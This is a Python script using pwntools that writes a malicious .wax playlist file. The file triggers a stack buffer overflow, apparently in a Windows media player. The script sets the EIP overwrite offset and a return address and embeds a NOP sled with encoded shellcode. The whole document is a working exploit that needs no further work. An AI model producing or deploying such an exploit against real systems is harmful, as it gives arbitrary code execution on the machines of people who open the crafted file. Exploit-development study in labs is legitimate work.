from pwn import *

cmd = "http://"
offset_to_eip = 1012
offset_to_esp = 1016
new_eip = 0x1010539F

#badchars = \x00\x0a\x0d\x20
shellcode =  b"\x90"*20
shellcode += b"\xbb\xc0\x93\xb3\xcf\xdb\xdf\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x5e\x12\x03\x5e\x12"
shellcode += b"\x83\x06\x97\x51\x3a\x7a\x70\x17\xc5\x82\x81"
shellcode += b"\x78\x4f\x67\xb0\xb8\x2b\xec\xe3\x08\x3f\xa0"
shellcode += b"\x0f\xe2\x6d\x50\x9b\x86\xb9\x57\x2c\x2c\x9c"
shellcode += b"\x56\xad\x1d\xdc\xf9\x2d\x5c\x31\xd9\x0c\xaf"
shellcode += b"\x44\x18\x48\xd2\xa5\x48\x01\x98\x18\x7c\x26"
shellcode += b"\xd4\xa0\xf7\x74\xf8\xa0\xe4\xcd\xfb\x81\xbb"
shellcode += b"\x46\xa2\x01\x3a\x8a\xde\x0b\x24\xcf\xdb\xc2"
shellcode += b"\xdf\x3b\x97\xd4\x09\x72\x58\x7a\x74\xba\xab"
shellcode += b"\x82\xb1\x7d\x54\xf1\xcb\x7d\xe9\x02\x08\xff"
shellcode += b"\x35\x86\x8a\xa7\xbe\x30\x76\x59\x12\xa6\xfd"
shellcode += b"\x55\xdf\xac\x59\x7a\xde\x61\xd2\x86\x6b\x84"
shellcode += b"\x34\x0f\x2f\xa3\x90\x4b\xeb\xca\x81\x31\x5a"
shellcode += b"\xf2\xd1\x99\x03\x56\x9a\x34\x57\xeb\xc1\x50"
shellcode += b"\x94\xc6\xf9\xa0\xb2\x51\x8a\x92\x1d\xca\x04"
shellcode += b"\x9f\xd6\xd4\xd3\xe0\xcc\xa1\x4b\x1f\xef\xd1"
shellcode += b"\x42\xe4\xbb\x81\xfc\xcd\xc3\x49\xfc\xf2\x11"
shellcode += b"\xdd\xac\x5c\xca\x9e\x1c\x1d\xba\x76\x76\x92"
shellcode += b"\xe5\x67\x79\x78\x8e\x02\x80\xeb\x71\x7a\x85"
shellcode += b"\xbe\x19\x79\x99\x51\x86\xf4\x7f\x3b\x26\x51"
shellcode += b"\x28\xd4\xdf\xf8\xa2\x45\x1f\xd7\xcf\x46\xab"
shellcode += b"\xd4\x30\x08\x5c\x90\x22\xfd\xac\xef\x18\xa8"
shellcode += b"\xb3\xc5\x34\x36\x21\x82\xc4\x31\x5a\x1d\x93"
shellcode += b"\x16\xac\x54\x71\x8b\x97\xce\x67\x56\x41\x28"
shellcode += b"\x23\x8d\xb2\xb7\xaa\x40\x8e\x93\xbc\x9c\x0f"
shellcode += b"\x98\xe8\x70\x46\x76\x46\x37\x30\x38\x30\xe1"
shellcode += b"\xef\x92\xd4\x74\xdc\x24\xa2\x78\x09\xd3\x4a"
shellcode += b"\xc8\xe4\xa2\x75\xe5\x60\x23\x0e\x1b\x11\xcc"
shellcode += b"\xc5\x9f\x31\x2f\xcf\xd5\xd9\xf6\x9a\x57\x84"
shellcode += b"\x08\x71\x9b\xb1\x8a\x73\x64\x46\x92\xf6\x61"
shellcode += b"\x02\x14\xeb\x1b\x1b\xf1\x0b\x8f\x1c\xd0"


payload = fit({
	0:cmd,
	offset_to_eip:new_eip,
	offset_to_esp:shellcode,
	},length=5000)

file = open('exploit.wax','wb')
file.write(payload)
file.close()